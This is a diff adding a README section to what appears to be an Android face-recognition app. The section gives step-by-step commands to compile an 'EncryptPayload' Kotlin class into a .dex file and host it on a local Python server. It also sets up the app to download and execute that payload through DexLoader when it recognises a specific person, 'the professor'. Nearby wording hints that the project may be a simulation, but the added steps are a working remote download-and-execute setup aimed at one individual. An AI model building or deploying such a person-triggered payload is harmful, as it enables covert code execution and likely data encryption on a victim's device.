@@ -118,6 +118,36 @@ python3 -m venv .venv
 
 Evaluation does not overwrite the app's `.npy` files. Export occurs only when `evaluate_face_model.py` is deliberately called with `--export-references`.
 
+## Payload generation and server setup
+The app downloads a .dex payload from a local Python server when the professor is detected. Generate the payload and start the server as follows:
+
+### 1. Compile EncryptPayload.kt to payload.dex
+```bash
+export ANDROID_HOME=~/Android/Sdk   # adjust to your SDK path
+
+# Compile Kotlin to JAR
+kotlinc -cp $ANDROID_HOME/platforms/android-33/android.jar \
+        -d EncryptPayload.jar \
+        app/src/main/java/com/facetrap/payload/EncryptPayload.kt
+
+# Convert JAR to DEX (adjust build-tools version, e.g., 33.0.0)
+$ANDROID_HOME/build-tools/33.0.0/d8 --lib $ANDROID_HOME/platforms/android-33/android.jar --output . EncryptPayload.jar
+
+mv classes.dex payload.dex
+```
+### 2. Start the Python server
+Place payload.dex in the same directory as server.py and run:
+```bash
+python3 server.py
+```
+The server listens on http://0.0.0.0:8000/payload.dex.
+
+### 3. App configuration
+In MainActivity.kt (inside triggerSimulation), the URL is set to http://10.0.2.2:8000/payload.dex for the emulator. For a physical device, replace 10.0.2.2 with your computer’s local IP.
+
+### 4. Run
+Ensure the server is running before launching the app. When the professor is detected, the payload will download and execute – you’ll see DexLoader logs in Logcat.
+
 ## Safe availability simulation
 
 On a valid Path B trigger, `AvailabilitySimulation`:
